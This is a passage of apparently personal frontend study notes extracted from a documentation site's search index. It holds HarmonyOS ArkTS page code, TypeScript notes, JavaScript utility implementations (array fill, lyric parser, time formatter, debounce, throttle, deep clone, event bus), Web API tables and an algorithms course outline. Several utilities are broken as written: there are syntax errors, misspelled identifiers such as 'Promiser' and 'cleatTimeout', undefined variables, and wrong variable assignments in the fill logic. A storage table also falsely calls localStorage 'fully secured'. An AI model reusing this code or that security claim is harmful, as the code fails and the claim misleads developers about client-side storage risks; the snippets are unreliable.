Text('\u8bf7\u70b9\u51fb\u5934\u50cf\u767b\u5f55')\n            .fontSize(12)\n            .fontWeight(FontWeight.Medium)\n            .fontColor(Color.Black)\n            .margin({ top: 4 })\n        }\n      }\n      .width('100%')\n      .height('50%')\n      .backgroundImage(this.token ? this.userInfo.avatarUrl : $r('app.media.img_avatar'))\n      .backgroundImageSize({ height: '100%', width: '100%' })\n      .backgroundBlurStyle(BlurStyle.Regular)\n\n      Column({ space: 10 }) {\n        this.mineItemBuilder($r('app.media.ic_mine_card'), '\u6253\u5361\u8bb0\u5f55', () =&gt; {\n          if (this.token) {\n            router.pushUrl({ url: 'pages/PostHistoryPage' })\n          } else {\n            promptAction.showToast({ message: '\u8bf7\u5148\u70b9\u51fb\u5934\u50cf\u767b\u5f55' })\n          }\n        })\n        Divider()\n        this.mineItemBuilder($r('app.media.ic_mine_update'), '\u68c0\u67e5\u66f4\u65b0', () =&gt; {\n          promptAction.showToast({ message: '\u5df2\u662f\u6700\u65b0' })\n        })\n        Divider()\n        this.mineItemBuilder($r('app.media.ic_mine_about'), '\u5173\u4e8e', () =&gt; {\n          promptAction.showToast({ message: '\u6ca1\u6709\u5173\u4e8e' })\n        })\n\n        Blank()\n\n        if (this.token) {\n          Button('\u9000\u51fa\u767b\u5f55')\n            .width('100%')\n            .fontSize(18)\n            .backgroundColor(Color.Gray)\n            .fontColor(Color.White)\n            .onClick(() =&gt; {\n              this.token = ''\n            })\n        }\n\n      }\n      .width('100%')\n      .height('60%')\n      .offset({ y: '40%' })\n      .borderRadius({ topLeft: 50, topRight: 50 })\n      .backgroundColor(Color.White)\n      .padding(30)\n\n    }.width('100%')\n    .height('100%')\n    .alignContent(Alignment.Top)\n  }\n\n  @Builder\n  mineItemBuilder(icon: Resource, title: string, callback?: () =&gt; void) {\n    Row({ space: 10 }) {\n      Image(icon)\n        .width(24)\n        .height(24)\n      Text(title)\n        .fontSize(16)\n        .height(24)\n        .fontWeight(FontWeight.Medium)\n      Blank()\n      Image($r('app.media.ic_arrow_right'))\n        .width(24)\n        .height(24)\n    }.width('100%')\n    .height(40)\n    .onClick(() =&gt; {\n      callback();\n    })\n  }\n}\n</code></pre> <p>\u6253\u5361\u8bb0\u5f55</p> <pre><code>import { getMyPost } from '../http/Api';\nimport { PostInfo } from '../model/PostInfo';\nimport router from '@ohos.router';\nimport promptAction from '@ohos.promptAction';\nimport { convertMillisecondsToTime } from '../utils/DataUtil';\n\n@Entry\n@Component\nstruct PostHistoryPage {\n  @State postInfoList: PostInfo[] = []\n  page: number = 1;\n  total: number = 0;\n\n  onPageShow() {\n    this.postInfoList = []\n    this.page = 1\n    this.total = 0\n    this.getMyPostInfoList(this.page)\n  }\n\n  async getMyPostInfoList(page: number) {\n    let response = await getMyPost(page, 10)\n    response.data.data.records.forEach(post =&gt; this.postInfoList.push(new PostInfo(post)))\n    this.total = response.data.data.total;\n    this.page += 1;\n  }\n\n  build() {\n    Column() {\n      Row() {\n        Image($r('app.media.ic_back'))\n          .width(24)\n          .height(24)\n          .onClick(() =&gt; {\n            router.back()\n          })\n        Text('\u6253\u5361\u8bb0\u5f55')\n          .fontSize(18)\n          .fontWeight(FontWeight.Bold)\n        Image($r('app.media.ic_back'))\n          .width(24)\n          .height(24)\n          .visibility(Visibility.Hidden)\n      }.width('100%')\n      .height(40)\n      .justifyContent(FlexAlign.SpaceBetween)\n      .padding({ left: 20, right: 20 })\n\n      Divider()\n        .color(Color.Black)\n        .margin({ left: 20, right: 20 })\n\n      if (this.postInfoList.length &gt; 0) {\n        this.listBuilder()\n      } else {\n        this.emptyBuilder()\n      }\n\n    }\n    .height('100%')\n    .width('100%')\n    .padding({\n      top: 40\n    })\n  }\n\n  @Builder\n  listBuilder() {\n    List() {\n      ForEach(this.postInfoList, (post) =&gt; {\n        ListItem() {\n          this.postItemBuilder(post)\n        }.width('100%')\n      })\n    }\n    .width('100%')\n    .layoutWeight(1)\n    .alignListItem(ListItemAlign.Center)\n    .onReachEnd(() =&gt; {\n      if (this.postInfoList.length &lt; this.total) {\n        this.getMyPostInfoList(this.page)\n      } else {\n        promptAction.showToast({ message: '\u6ca1\u6709\u66f4\u591a\u7684\u6570\u636e\u4e86...' })\n      }\n    })\n  }\n\n  @Builder\n  emptyBuilder() {\n    Column() {\n      Image($r('app.media.ic_empty'))\n        .width(200)\n        .height(200)\n      Text('\u6682\u65e0\u6570\u636e')\n        .fontSize(20)\n        .fontWeight(FontWeight.Medium)\n        .fontColor('#7e8892')\n    }.width('100%')\n    .layoutWeight(1)\n    .justifyContent(FlexAlign.Center)\n  }\n\n  @Builder\n  postItemBuilder(post: PostInfo) {\n    Row() {\n      Column({ space: 10 }) {\n        Text(post.createTime)\n          .fontSize(14)\n          .fontColor('#999999')\n          .height(21)\n        Row() {\n          Text('\u5355\u8bcd\u6570 : ' + post.answeredCount)\n            .fontSize(14)\n            .fontColor('#1C1C1C')\n            .height(21)\n            .margin({\n              right: 20\n            })\n          Text('\u51c6\u786e\u7387 : ' + (post.rightCount / post.answeredCount * 100).toFixed(0) + '%')\n            .fontSize(14)\n            .fontColor('#1C1C1C')\n            .height(21)\n        }\n\n        Text('\u7528\u65f6 : ' + convertMillisecondsToTime(post.timeUsed))\n          .fontSize(14)\n          .fontColor('#1C1C1C')\n          .height(21)\n\n      }.alignItems(HorizontalAlign.Start)\n\n      Blank()\n\n      Text(post.createTime.substring(8, 10))\n        .width(58)\n        .height(58)\n        .fontSize(18)\n        .textAlign(TextAlign.Center)\n        .fontColor('#333333')\n        .fontWeight(FontWeight.Bold)\n        .backgroundImage($r('app.media.ic_history_date'))\n        .backgroundImageSize(ImageSize.Contain)\n    }\n    .borderWidth(1)\n    .padding(10)\n    .borderRadius(10)\n    .shadow({ radius: 20 })\n    .width('90%')\n    .margin({ top: 10 })\n  }\n}\n</code></pre>"},{"location":"JS/test/#9","title":"9. \u5e94\u7528\u4fe1\u606f","text":""},{"location":"JS/test/#91","title":"9.1. \u6982\u8ff0","text":"<p>\u9700\u8981\u4fee\u6539\u7684\u4fe1\u606f\u4e3b\u8981\u5305\u62ec\u5e94\u7528\u7684\u56fe\u6807\u548c\u540d\u79f0\uff0c\u5982\u4e0b\u56fe\u6240\u793a</p>"},{"location":"JS/test/#92","title":"9.2. \u5b9e\u73b0\u601d\u8def","text":""},{"location":"JS/test/#921","title":"9.2.1. \u6240\u9700\u6280\u80fd","text":"<ol> <li>\u719f\u6089\u9e3f\u8499\u5e94\u7528Stage\u6a21\u578b\u57fa\u672c\u6982\u5ff5</li> <li>\u719f\u6089\u57fa\u4e8eStage\u6a21\u578b\u6240\u521b\u5efa\u5de5\u7a0b\u7684\u914d\u7f6e\u6587\u4ef6</li> </ol> <p>\u4e0a\u8ff0\u5185\u5bb9\u53ef\u53c2\u8003HarmonyOS 4.0 \u5e94\u7528\u5f00\u53d1\u4e2d\u7684\u7b2c15\u7ae0\u3002</p>"},{"location":"JS/test/#922","title":"9.2.2. \u5b9e\u73b0\u601d\u8def","text":"<p>\u5728\u9e3f\u8499\u5e94\u7528\u4e2d\uff0c\u684c\u9762\u4e0a\u542f\u52a8\u5e94\u7528\u7684\u56fe\u6807\u4ee5UIAblitity\u4e3a\u7c92\u5ea6\uff0c\u652f\u6301\u540c\u4e00\u4e2a\u5e94\u7528\u5b58\u5728\u591a\u4e2a\u542f\u52a8\u56fe\u6807\uff0c\u70b9\u51fb\u540e\u4f1a\u542f\u52a8\u5bf9\u5e94\u7684UIAblitity\uff0c\u56e0\u6b64\u684c\u9762\u56fe\u6807\u9700\u8981\u5728<code>module.json5</code>\u6587\u4ef6\u4e2d\u7684\u5bf9\u5e94\u7684Ablitity\u4e2d\u8fdb\u884c\u914d\u7f6e\u3002</p> <p>\u8bbe\u7f6e\u754c\u9762\u4e2d\u7684\u5e94\u7528\u56fe\u6807\u662f\u4ee5\u5e94\u7528\u4e3a\u7c92\u5ea6\u7684\uff0c\u6bcf\u4e2a\u5e94\u7528\u53ea\u80fd\u8bbe\u7f6e\u4e00\u4e2a\uff0c\u9700\u8981\u5728<code>app.json5</code>\u6587\u4ef6\u4e2d\u914d\u7f6e\u3002</p>"},{"location":"JS/ts/","title":"Ts","text":""},{"location":"JS/ts/#_1","title":"\u7c7b\u578b\u6ce8\u89e3","text":"<p>\u7c7b\u578b\u7ea6\u675f:\u7ea6\u675f\u4e86\u53d8\u91cf\u8d4b\u503c\u7684\u7c7b\u578b</p> <p>\u5b57\u9762\u91cf\u7c7b\u578b <pre><code>type direction = 'up' | 'down' | 'left' | 'right'\n</code></pre></p> <p>\u7c7b\u578b\u522b\u540d</p> <p>\u63a5\u53e3\u7ee7\u627f</p> <pre><code>interface Point2D {x:numer, y:number}\ninterface Point3D extends Point2D {z: number}\n</code></pre> <p>\u5143\u7ec4 \u5305\u542b\u5143\u7d20,\u4ee5\u53ca\u7279\u5b9a\u7d22\u5f15\u5bf9\u5e94\u7684\u7c7b\u578b</p> <p>\u7c7b\u578b\u65ad\u8a00</p> <p>\u7c7b\u578b\u5bbd\u6cdb <pre><code>const linkEl = document.getElementById('link') as HTMLAnchorElement\n</code></pre> devtool console<pre><code>console.dir($0)\n__proto__: HTMLAnchorElement\n</code></pre></p>"},{"location":"JS/ts/#_2","title":"\u7c7b\u578b","text":""},{"location":"JS/ts/#_3","title":"\u63a5\u53e3\u7684\u7ee7\u627f","text":""},{"location":"JS/ts/#_4","title":"\u63a5\u53e3\u7684\u5b9e\u73b0","text":""},{"location":"JS/ts/#_5","title":"\u53ef\u89c1\u6027\u4fee\u9970\u7b26","text":"<p>public  \u5728\u7c7b\u548c\u5b50\u7c7b\u548c\u5b9e\u4f8b\u5bf9\u8c61\u4e2d\u90fd\u53ef\u89c1 protected \u4ec5\u5728\u7c7b\u4e2d\u548c\u5b50\u7c7b\u4e2d\u53ef\u89c1\uff0c\u5b9e\u4f8b\u5bf9\u8c61\u4e0d\u53ef\u89c1 private \u4ec5\u5728\u7c7b\u4e2d\u53ef\u89c1\uff0c\u5b9e\u4f8b\u548c\u5b50\u7c7b\u4e2d\u4e0d\u53ef\u89c1</p>"},{"location":"JS/ts/#_6","title":"\u53ea\u8bfb\u4fee\u9970\u7b26","text":""},{"location":"JS/ts/#_7","title":"\u7c7b\u578b\u517c\u5bb9\u6027","text":"<p>\u7ed3\u6784\u5316\u7c7b\u578b\u7cfb\u7edf duck type</p> <p>\u6807\u660e\u7c7b\u578b\u7cfb\u7edf</p>"},{"location":"JS/ts/#_8","title":"\u6cdb\u578b","text":"<p>\u7c7b\u578b\u53d8\u91cf determine at call time, same at this</p> <pre><code>join(separator?:string): string\nslice(state?:nubmer, end?:number): T[]\n</code></pre>"},{"location":"JS/ts/#_9","title":"\u6cdb\u578b\u5de5\u5177","text":""},{"location":"JS/ts/#_10","title":"\u7d22\u5f15\u7b7e\u540d","text":""},{"location":"JS/ts/#_11","title":"\u6620\u5c04\u7c7b\u578b","text":"<pre><code>type Partial&lt;T&gt; = {\n  [p in keyof T]?: T[p]\n}\n</code></pre> <p>\u7d22\u5f15\u67e5\u8be2\u7c7b\u578b</p>"},{"location":"JS/types/","title":"Types","text":""},{"location":"JS/types/#indexed-collections","title":"Indexed Collections","text":"<ul> <li><code>Array</code></li> <li><code>Int8Array</code></li> <li><code>Uint8Array</code></li> <li><code>Uint8ClampedArray</code></li> <li><code>Int16Array</code></li> <li><code>Uint16Array</code></li> <li><code>Int32Array</code></li> <li><code>Uint32Array</code></li> <li><code>Float32Array</code></li> <li><code>Float64Array</code></li> <li><code>BigInt64Array</code></li> <li><code>BigUint64Array</code></li> </ul>"},{"location":"JS/types/#keyed-collections","title":"Keyed collections","text":"<ul> <li><code>Map</code></li> <li><code>Set</code></li> <li><code>WeakMap</code></li> <li><code>WeakSet</code></li> </ul>"},{"location":"JS/types/#internationalization","title":"Internationalization","text":"<ul> <li><code>Intl</code></li> <li><code>Intl.Collator</code></li> <li><code>Intl.DateTimeFormat</code></li> <li><code>Intl.DisplayNames</code></li> <li><code>Intl.ListFormat</code></li> <li><code>Intl.Locale</code></li> <li><code>Intl.NumberFormat</code></li> <li><code>Intl.PluralRules</code></li> <li><code>Intl.RelativeTimeFormat</code></li> </ul>"},{"location":"JS/types/#structured-data","title":"Structured data","text":"<ul> <li><code>ArrayBuffer</code></li> <li><code>SharedArrayBuffer</code></li> <li><code>Atomics</code></li> <li><code>DataView</code></li> <li><code>JSON</code></li> </ul> <p>Control flow</p> <ul> <li>Block</li> <li>break</li> <li>continue</li> <li>Empty</li> <li>if...else</li> <li>switch</li> <li>throw</li> <li>try...catch</li> </ul>"},{"location":"JS/typescript/","title":"typescript deep dive","text":"<ul> <li>scanner( scanner.ts)</li> <li>parser(parser.ts)</li> <li>binder(binder.ts)</li> <li>checker(checker.ts)</li> <li>aemitter(emitter.ts)</li> </ul>"},{"location":"JS/typescript/#index-signatrue","title":"index signatrue","text":"<pre><code>const propertyKey = String | Symbol | Number\n\n\n// toString method will get called whenever the obj is used in an index position\nconst o = {\n  toString(){\n        console.log('toString Called')\n  }\n}\n\n\n// default toString implementation on an object is pretty awful, e.g. on v8 it always returns [object Object]:\n</code></pre>"},{"location":"JS/utils/","title":"Utils","text":""},{"location":"JS/utils/#array","title":"Array","text":"<p>array construct</p>"},{"location":"JS/utils/#array-fill","title":"array fill","text":"<pre><code>// fill(value)\n// fill(value, start)\n// fill(value, start, end)\n\nfunction customFill(value, start, end) {\n  let actualStart,actualEnd;\n\n  if((start !== undefined &amp;&amp; isNaN(start)) || (end !== undefined &amp;&amp; isNaN(end))) {\n        return this\n  }\n\n    if (!start) {\n        actualStart = 0\n  } else if (start &lt; -array.length)) {\n        actualStart = 0\n  } else if (start &lt; 0) {\n    actualStart = this.length + start\n  } else if (start &gt;= this.length){\n            return this\n  } else {\n    actualStart = start\n  }\n\n    if (!end) {\n        actualEnd = 0\n  } else if (end &lt; -array.length)) {\n        actualStart = 0\n  } else if (end &lt; 0) {\n    actualStart = this.length + end\n  } else if (end &gt;= this.length){\n            return this\n  } else {\n    actualEnd = this.length\n  }\n\n    for (let i = actualStart; i &lt; actualEnd; i++){\n    this[i] = value;\n  }\n  return this;\n\n\n}\nArray.prototype._fill = customFill\n</code></pre> <p>usecase: fill the board</p> <pre><code>Array(9).fill(null)\n</code></pre> <p>length-altering mutation methods</p> <ul> <li>push</li> <li>pop</li> <li>shift</li> <li>unshift</li> <li>splice</li> </ul>"},{"location":"JS/utils/#parameters","title":"Parameters","text":"<ul> <li><code>value</code></li> </ul> <p>Value to fill the array with. Note all elements in the array will be this exact value: if <code>value</code> is an object, each slot in the array will reference that object.</p> <ul> <li><code>start</code> Optional</li> </ul> <p>Zero-based index at which to start filling, converted to an integer.Negative index counts back from the end of the array \u2014 if <code>-array.length &lt;= start &lt; 0</code>, <code>start + array.length</code> is used.If <code>start &lt; -array.length</code> or <code>start</code> is omitted, <code>0</code> is used.If <code>start &gt;= array.length</code>, no index is filled.</p> <ul> <li><code>end</code> Optional</li> </ul> <p>Zero-based index at which to end filling, converted to an integer. <code>fill()</code> fills up to but not including <code>end</code>.Negative index counts back from the end of the array \u2014 if <code>-array.length &lt;= end &lt; 0</code>, <code>end + array.length</code> is used.If <code>end &lt; -array.length</code>, <code>0</code> is used.If <code>end &gt;= array.length</code> or <code>end</code> is omitted, <code>array.length</code> is used, causing all indices until the end to be filled.If <code>end</code> implies a position before or at the position that <code>start</code> implies, nothing is filled.</p>"},{"location":"JS/utils/#return-value","title":"Return value","text":"<p>The modified array, filled with <code>value</code>.</p>"},{"location":"JS/utils/#lyric-format","title":"lyric format","text":"<pre><code>const parseLyric = (lrcRaw) =&gt; {\n  const lrcLines = lrc.split('\\n')\n  const lrcParsed = []\n  // /[01:22:550]/\n  const extractTimestampRegex = /\\[(?&lt;min&gt;\\d{2}):(?&lt;sec&gt;\\d{2})(?:\\.|:)(?&lt;ms&gt;\\d{2,3})\\]/\n  for (const line of lrcLines.trim()) {\n    const match = line.match(timeStampRegex)\n    !match &amp;&amp; continue\n    const {min,sec,ms} = match.groups\n    const time = Number(min)*60 + Number(sec) + Number(ms) * .001\n    const content = match.replace(extractTimestampRegex,\"\").trim()\n    lrcParsed.push({time, content})\n  }\n}\n</code></pre>"},{"location":"JS/utils/#time-format","title":"time format","text":"<pre><code>// yyyy/MM/dd hh:mm:ss\n// hh:mm:ss yyyy/MM/dd\n// yyyy-MM-dd hh.mm.ss\n// hh:mm:ss\nconst formatTime = (timestamp, format) =&gt; {\n    const date = new Date(timestamp)\n  const timeCmps = {\n    'y+': date.getFullYear(),\n    'M+': date.getMonth() + 1,\n    'd+': date.getDate(),\n    'h+': date.getHours(),\n    'm+': date.getMinutes(),\n    's+': date.getSeconds(),\n  }\n  for(const pattern in timeCmps) {\n    const patternRe = new Regex(pattern)\n    if(patternRe.test(format)){\n      const val = (timeCmps[key] + \"\").padStart(2,\"0\")\n      format.replace(patternRe, val)\n    }\n  }\n  return format\n}\n</code></pre>"},{"location":"JS/utils/#_1","title":"\u9632\u6296","text":"<p>\u8f93\u5165\u8054\u60f3 \u4e8b\u4ef6\u89e6\u53d1\u65f6\uff0c\u54cd\u5e94\u51fd\u6570\u4e0d\u4f1a\u7acb\u5373\u6267\u884c\uff0c\u800c\u662f\u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4 \u5f53\u4e8b\u4ef6\u5bc6\u96c6\u9891\u7e41\u89e6\u53d1\u65f6\uff0c\u51fd\u6570\u7684\u6267\u884c\u4f1a\u88ab\u9891\u7e41\u5ef6\u8fdf \u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4\u540e\u8fd8\u6ca1\u6709\u4e8b\u4ef6\u89e6\u53d1\uff0c\u624d\u4f1a\u771f\u6b63\u6267\u884c\u54cd\u5e94\u51fd\u6570</p> <ul> <li> \u6838\u5fc3\u5b9e\u73b0:\u9632\u6296(\u5ef6\u8fdf\u548c\u53d6\u6d88\u4e0a\u6b21)</li> <li> \u53c2\u6570\u7ed1\u5b9a: this\u548cargs</li> <li> \u53d6\u6d88\u529f\u80fd</li> <li> \u7acb\u5373\u6267\u884c</li> <li> \u83b7\u53d6\u8fd4\u56de\u503c</li> <li> \u5c01\u88c5\u72ec\u7acb\u51fd\u6570</li> </ul> <pre><code>const debounce = (exec,delay, immediate = false) =&gt; {\n  // this is deterimined at call time\n  // inputEl.oninput() this = inputEl\n  let timer = null\n  let isInvoke = false\n\n\n\n  function _debounce(...args){// argument&amp;this binding\n    return new Promiser((resolve, reject) =&gt; {\n      timer &amp;&amp; clearTimeout(timer)\n\n      let result = null\n\n      if(immediate &amp;&amp; !isInvoke) {\n        result = exec.apply(this,args)\n        resolve(result)\n        isInvoke = false\n        return\n      }\n\n      timer = setTimeout(()=&gt; {\n        result = exec.apply(this,args)\n        resolve(result)\n        timer = null\n        isInvoke = false\n      },delay)\n    })\n  }\n  // \u53d6\u6d88\u529f\u80fd\n  _debounce.cancel = () =&gt; {\n    timer &amp;&amp; clearTimeout(timer)\n    timer = null\n    isInvoke = false\n  }\n\n  return  _debounce\n}\n\nexport default debounce\n</code></pre>"},{"location":"JS/utils/#_2","title":"\u8282\u6d41","text":"<ul> <li> \u6838\u5fc3\u5b9e\u73b0</li> <li> \u53c2\u6570\u7ed1\u5b9a: this &amp; args</li> <li> \u7acb\u5373\u6267\u884c\u63a7\u5236</li> <li> \u5c3e\u90e8\u6267\u884c\u63a7\u5236 <pre><code>const throttle = (exec, interval, {lead = false, trail = false} = {}) =&gt; {\n  let startTime = 0 // \u8bb0\u5f55\u4e0a\u6b21\u6267\u884c\u7684\u7ed3\u679c\n  let timer = null\n\n\n  function _throttle (...args){\n    // \u6bcf\u6b21\u6267\u884c\u91cd\u65b0\u8ba1\u7b97\n    const currTime = Date.now().getTime()\n\n    // \u7acb\u5373\u6267\u884c\u63a7\u5236\n    if(!lead &amp;&amp; startTime === 0) {\n      startTime = nowTime\n    }\n\n    const timeSpan = currTime - startTime\n\n    if(timeSpan &gt;= interval){\n      timer &amp;&amp; cleatTimeout(timer)\n      exec.apply(this, ...args)\n      startTime = currTime\n      return\n    }\n\n    if (!trail &amp;&amp; !timer) {\n      const leftTime = interval - timeSpan\n      timer = setTimeout(()=&gt;{\n        exec.apply(this,args)\n        startTime = new Date().getTime()\n        time = null\n      },leftTime)\n    }\n  }\n\n  return _throttle\n}\n</code></pre></li> </ul>"},{"location":"JS/utils/#_3","title":"\u6df1\u62f7\u8d1d","text":"<ul> <li> fix self reference: Range Error: maxmium call stack exceeded</li> </ul> <pre><code>function isObject(val){\n  const valType = typeof val\n  return (val !== null) &amp;&amp; (valType === 'object' || valType === 'function')\n}\n\n\nconst deepClone = (origin, hashMap = new WeakMap) =&gt; {\n  // value is symbol(remains unique throughout the lifetime of the program. )\n  if (typeof origin === 'symbol' ) return Symbol(origin.description)\n  // valType: string, num, boolean (primitive)  or function\n  if (!isObject(origin) || typeof origin === 'function') return origin\n\n\n  //\n  if(hashMap.has(origin)) return hashMap.get(origin)\n  const target = Array.isArray(origin) ? [] : {}\n  hashMap.set(origin, target)\n  for (const key in origin) {\n    target[key] = deepClone(origin[key], hashMap)\n  }\n  const symbolKeys = Object.getOwnPropertySymbols(origin)\n  for (const key of symbolKeys) {\n    target[Symbol(key.description)] = deepCopy(origin[key])\n  }\n\n  return target\n}\n</code></pre>"},{"location":"JS/utils/#_4","title":"\u4e8b\u4ef6\u603b\u7ebf","text":"<p>\u89c2\u5bdf\u8005\u6a21\u5f0f\uff0c\u4e09\u4e2a\u89d2\u8272 \u53d1\u5e03\u8005(Publisher):\u53d1\u51fa\u4e8b\u4ef6event \u8ba2\u9605\u8005(Subscriber): \u8ba2\u9605\u4e8b\u4ef6\uff08event)\uff0c\u5e76\u4f1a\u8fdb\u884c\u54cd\u5e94 \u4e8b\u4ef6\u603b\u7ebf(EventBus):</p>"},{"location":"JS/utils/#_5","title":"\u5b9e\u73b0\u4e8b\u4ef6\u603b\u7ebf\u7684\u7b2c\u4e09\u65b9\u5e93","text":"<p>mitt</p>"},{"location":"JS/utils/#_6","title":"\u5b9e\u73b0\u81ea\u5df1\u7684\u4e8b\u4ef6\u603b\u7ebf","text":"<p>\u4e8b\u4ef6\u7684\u76d1\u542c\u65b9\u6cd5on \u4e8b\u4ef6\u7684\u53d1\u5c04\u65b9\u6cd5emit \u4e8b\u4ef6\u7684\u53d6\u6d88\u76d1\u542c\u65b9\u6cd5off</p> <p>\u4f5c\u4e3a\u5de5\u5177\u5e93\u7684\u5b9e\u73b0\uff0c\u524d\u7f00name-colision</p> <pre><code> class EventBus {\n   constructor(){\n     this._emits = {}\n   }\n   on(eventName, cb){\n     const handlers = this._emits[eventName] || []\n     handlers.push(cb)\n     this._emits[eventName] = handlers\n   }\n\n   emit(eventName, ...args){\n     this._emits[eventName].forEach(cb=&gt; cb(...args))\n   }\n\n   off(eventName, cb){\n     const cbs = this._emits[eventName] || []\n     const newCbs = cbs.filter(effect =&gt; effect != cb)\n     this._emits[eventName] = newCbs\n   }\n</code></pre>"},{"location":"JS/utils/#axios","title":"axios\u8bf7\u6c42\u4e8c\u6b21\u5c01\u88c5","text":"<p><code>request.ontimeout</code></p> <p><code>request.onabort</code></p>"},{"location":"JS/web-apis/","title":"Web apis","text":"<ul> <li>Histrory API</li> <li>Storage API</li> <li>Forms API</li> <li>Worker API</li> <li>Fetch API</li> <li>Geolocation API</li> </ul> <p><code>API</code>: </p> <p>you can use the GeoLocation API to get the coordinates of the users with two lines of code. You don\u2019t need to worry about how it works in the backend</p> <p><code>web API</code>: an application programming interface (API) for web</p> <p>power system at your home. When you plug the cable into the socket, you get electricity. You don\u2019t need to worry about how electricity comes into the socket</p> <ul> <li>Browser API (Client-Side JavaScript API)</li> <li>Server API</li> <li>Third Party APIs</li> </ul>"},{"location":"JS/web-apis/#browser-apis","title":"browser APIS","text":"<ul> <li>Storage API \u2212 It allows you to store the data in the browser's local storage.</li> <li>DOM API \u2212 It allows you to access DOM elements and manipulate them.</li> <li>History API \u2212 It allows you to get the browser\u2019s history.</li> <li>Fetch API \u2212 It allows you to fetch data from web servers.</li> <li> <p>Forms API \u2212 It allows you to validate the form data.</p> </li> <li> <p>localStorage</p> </li> </ul> <pre><code>localStorage.setItem(key, value); // To set key-value pair\nlocalStorage.getItem(key); \nlocalStorage.removeItem(key)\n</code></pre> <ul> <li>sessionStorage</li> </ul>"},{"location":"JS/web-apis/#cookie-vs-localstorage-vs-sessionstorage","title":"Cookie Vs localStorage Vs sessionStorage","text":"<p>Here, we have given the difference between the cookie, localStorage, and sessionStorage objects.</p> Feature Cookie Local storage Session storage Storage Limit 4 KB per cookie 5 MB 5 MB Expiry It has an expiry date. It never expires. It gets deleted when you close the browser window. Accessibility It can be accessed on both the client and server. It can be accessed by the client only. It can be accessed by the client only. Security It can be vulnerable. It is fully secured. It is fully secured. Property/Method Description key(n) To get the name of the nth key from the local or session storage. length To get the count of key-value pairs in the local or session storage. getItem(key) To get a value related to the key passed as an argument. setItem(key, value) To set or update key-value pair in the local or session storage. removeItem(key) To remove key-value pairs from the storage using its key. clear() To remove all key-value pairs from the local or session storage. <p>a set of JavaScript bindings to native iOS, Android and Web APIs. Using these bindings, we're able to control the use interface and access device hardware, like the camera.</p>"},{"location":"JS/web-apis/#form-api","title":"form API","text":"Property Description customError It contains a true boolean value when you set the custom validity message. patternMismatch When the parent element's value doesn't match the pattern, it sets true. rangeOverflow It returns a boolean value based on whether the input value is greater than the max attribute's value. rangeUnderflow It returns a boolean value based on whether the input value is less than the min attribute's value. stepMismatch It returns a boolean value based on whether the step is mismatching in the numeric input. tooLong If the length of the input element's value is greater than the maxLength attribute's value, it returns true. Otherwise, it returns false. typeMismatch When the type of entered value doesn't match the 'type' attribute's value, it returns true. valueMissing It returns a boolean value based on whether the input element is empty. valid It returns true when the input element is valid."},{"location":"algorithm/","title":"\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5","text":"<ul> <li>\u7b97\u6cd5</li> <li>state machine / data transfer pipeline</li> <li>divide and conquer, merge if need</li> <li>travese \u904d\u5386</li> <li>count \u8bb0\u6570</li> <li>reset \u91cd\u7f6e</li> <li>acc \u7d2f\u52a0</li> <li>\u524d\u7aef\u4e2d\u7684\u7b97\u6cd5</li> <li>\u5927\u5382\u7b97\u6cd5\u5b9e\u6218</li> </ul>"},{"location":"algorithm/#timsort-javascriptjavapython","title":"TimSort: Javascript\u3001Java\u3001Python\u5e95\u5c42\u90fd\u5728\u7528\u7684\u6392\u5e8f\u7b97\u6cd5","text":"<p>1.TimSort\u80cc\u666f 2.\u5bf9\u6bd4V8\uff0c\u7528js\u5b9e\u73b0TimSort 3.\u5b9e\u73b0\u5206\u533a\u7684\u83b7\u53d6\u4e0e\u5408\u5e76\u3001Galloping Search\u3001\u4e8c\u4efd\u67e5\u627e\u3001\u4e8c\u4efd\u63d2\u5165\u6392\u5e8f 4.\u5341\u5927\u57fa\u7840\u6392\u5e8f:   \u5192\u6ce1\u6392\u5e8f\u3001\u5feb\u901f\u6392\u5e8f\u3001\u9009\u62e9\u6392\u5e8f\u3001\u63d2\u5165\u6392\u5e8f\u3001\u5f52\u5e76\u6392\u5e8f\u3001\u8ba1\u6570\u6392\u5e8f\u3001\u57fa\u6570\u6392\u5e8f\u3001\u6876\u6392\u5e8f\u3001\u5806\u6392\u5e8f</p>"},{"location":"algorithm/#vue3-vdom-diffreact18-vdom-diff","title":"Vue3 VDOM DIFF\u4e0eReact18 VDOM DIFF","text":"<p>1.VDOM\u7684what\u3001how\u3001where 2.VDOM DIFF\u5230\u5e95\u5728\u505a\u4ec0\u4e48 3.\u4ece\u6e90\u7801\u5b9e\u73b0\u4e0a\u5bf9\u6bd4Vue3 VDOM DIFF \u4e0eReact18 VDOM DIFF</p>"},{"location":"algorithm/#vue3-vdom-diff","title":"Vue3 VDOM DIFF\u5b9e\u73b0","text":"<p>1.\u4e00\u884c\u884c\u6572\u4e00\u4e2aVue3 VDOM DIFF 2.\u5b9e\u73b0Vue3\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217\u7b97\u6cd5</p>"},{"location":"algorithm/#react-vdom-diff","title":"React VDOM DIFF\u5b9e\u73b0","text":"<p>1.\u4e00\u884c\u884c\u6572\u4e00\u4e2aReact18 VDOM DIFF 2.\u8282\u70b9\u7684\u65b0\u589e\u3001\u590d\u7528\u4e0e\u5220\u9664\u8be6\u89e3</p>"},{"location":"algorithm/#react","title":"React\u5e95\u5c42\u7684\u94fe\u8868","text":"<p>1.Fiber\u8be6\u89e3 2.\u5a46\u5ab3Hooks\u6d41\u884c\u7684\u539f\u56e0\u4e0e\u6570\u636e\u7ed3\u6784 3.\u6e90\u7801\u5256\u6790Updata\u5b58\u50a8\u4e0e\u4f5c\u7528</p>"},{"location":"algorithm/#react_1","title":"\u6700\u5c0f\u5806: React\u4e2d\u7684\u4efb\u52a1\u8c03\u5ea6\u7b97\u6cd5","text":"<p>1.React\u4e0d\u540c\u4f18\u5148\u7ea7\u7684\u4efb\u52a1\u5904\u7406 2.\u4efb\u52a1\u8c03\u5ea6\u7b97\u6cd5\u5b9e\u73b0</p>"},{"location":"algorithm/#vue-keep-alive-lru","title":"\u54c8\u5e0c\u8868\u4e0eVue keep-alive LRU\u7b97\u6cd5","text":"<p>1.Vue\u4e2dkeep-alive\u65b9\u6848\u7684\u5b9e\u73b0\u539f\u7406\u6e90\u7801\u5a46\u5ab3 2.\u5b9e\u73b0LRU</p>"},{"location":"algorithm/#_1","title":"\u7f16\u8f91\u539f\u7406\u5165\u95e8","text":"<p>1.\u7528js\u5b9e\u73b0\u4e00\u4e2a\u7f16\u8bd1\u5668 